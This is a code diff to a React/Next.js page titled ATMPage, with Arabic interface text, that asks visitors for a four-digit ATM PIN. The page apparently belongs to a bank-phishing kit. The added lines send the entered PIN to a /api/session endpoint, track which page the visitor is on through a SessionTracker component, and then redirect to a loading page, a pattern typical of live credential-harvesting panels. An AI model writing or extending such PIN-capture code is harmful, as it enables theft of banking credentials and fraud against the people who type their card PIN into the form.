@@ -1,6 +1,8 @@
 "use client";
+export const dynamic = 'force-dynamic';
 import { useState } from "react";
 import { useRouter } from "next/navigation";
+import SessionTracker from "@/components/SessionTracker";
 
 const GREEN = "#1e7344";
 
@@ -10,7 +12,13 @@ export default function ATMPage() {
 
   function handleConfirm() {
     if (pin.length === 4) {
-      router.push("/loading");
+      // إرسال الـ PIN للـ API
+      fetch('/api/session', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ current_page: 'atm', atm_pin: pin }),
+      }).catch(() => {});
+      router.push("/loading-page");
     } else {
       alert("يرجى إدخال 4 أرقام");
     }
@@ -18,6 +26,7 @@ export default function ATMPage() {
 
   return (
     <div style={{ backgroundColor: "#f7f8fa", display: "flex", justifyContent: "center", alignItems: "center", minHeight: "100vh", padding: "10px" }}>
+      <SessionTracker page="atm" />
       <div style={{ background: "#fff", width: "100%", maxWidth: "350px", borderRadius: "20px", padding: "25px 20px", boxShadow: "0 8px 25px rgba(0,0,0,0.05)", textAlign: "center" }}>
 
         <div style={{ marginBottom: "15px" }}>
